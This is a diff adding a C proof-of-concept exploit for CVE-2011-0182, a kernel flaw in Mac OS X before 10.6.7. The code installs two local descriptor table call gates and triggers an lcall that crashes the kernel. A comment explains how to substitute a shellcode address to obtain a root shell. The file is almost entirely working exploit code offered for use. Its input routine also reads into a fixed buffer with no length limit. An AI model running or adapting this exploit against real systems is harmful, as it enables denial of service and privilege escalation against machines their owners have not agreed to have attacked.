@@ -1,0 +1,78 @@
+/*
+	Mac OS X < 10.6.7 Kernel Panic Exploit
+	CVE-2011-0182, Proof Of Concept Code
+
+	Author	- Chanam Park (hkpco)
+	Date	- 2011. 06
+	Contact	- chanam.park@hkpco.kr , http://hkpco.kr , @hkpco
+
+	Thanks for inspiration / x82, riaf.
+*/
+// Compile: gcc -o CVE-2011-0182_PoC CVE-2011-0182_PoC.c -m32
+
+#include <architecture/i386/table.h>
+#include <i386/user_ldt.h>
+
+#include <unistd.h>
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+void dummy_func( void ) { asm volatile( ".byte 0xff" ); }
+
+int main( void )
+{
+	int ret;
+	union ldt_entry cgate, cgate2;
+	char dummy[128] = {0x00,};
+
+	cgate.call_gate.offset00        = (unsigned int)dummy_func & 0xffff;
+	cgate.call_gate.offset16        = ((unsigned int)dummy_func >> 16) & 0xffff;
+	// You can input shellcode address value here to get the root shell.
+	/* I got the root shell before. But, It was tested on Hackintosh for AMD. :-p
+	   The normal system has a little different environment.
+	   I have no time for this anymore because of my summer break is over.
+	   So.. Good Luck! */
+
+	cgate.call_gate.argcnt          = 0;
+	cgate.call_gate.type            = 0xc; // DESC_CALL_GATE
+	cgate.call_gate.dpl             = 3;
+	cgate.call_gate.present         = 1;
+
+	cgate.call_gate.seg.rpl         = 0;
+	cgate.call_gate.seg.ti          = 0;
+	cgate.call_gate.seg.index       = 16;
+
+	cgate2.call_gate.offset00       = 0x0;
+
+	cgate2.call_gate.seg.rpl        = 0;
+	cgate2.call_gate.seg.ti         = 0;
+	cgate2.call_gate.seg.index      = 0;
+
+	cgate2.call_gate.argcnt         = 0;
+	cgate2.call_gate.type           = 0;
+	cgate2.call_gate.dpl            = 0;
+	cgate2.call_gate.present        = 1;
+
+	cgate2.call_gate.offset16       = 0x0;
+
+	printf( "// coded by Chanam Park (hkpco)\n\n" );
+
+	ret = i386_set_ldt( LDT_AUTO_ALLOC, &cgate, 1 );
+	printf( "Selector Number in LDT <1>: 0x%x\n", ret );
+
+	ret = i386_set_ldt( LDT_AUTO_ALLOC, &cgate2, 1 );
+	printf( "Selector Number in LDT <2>: 0x%x\n\n", ret );
+
+	printf( "If you run this program, it can possibly cause \"Kernel Panic\".\n" );
+	printf( "The program will be continued when you input any value.\n" );
+	printf( "-> " );
+	fflush(stdout);
+	scanf( "%s", dummy );
+
+	asm volatile( "lcall $0x3f, $0x0" );
+	// Trigger
+
+	return 0;
+}
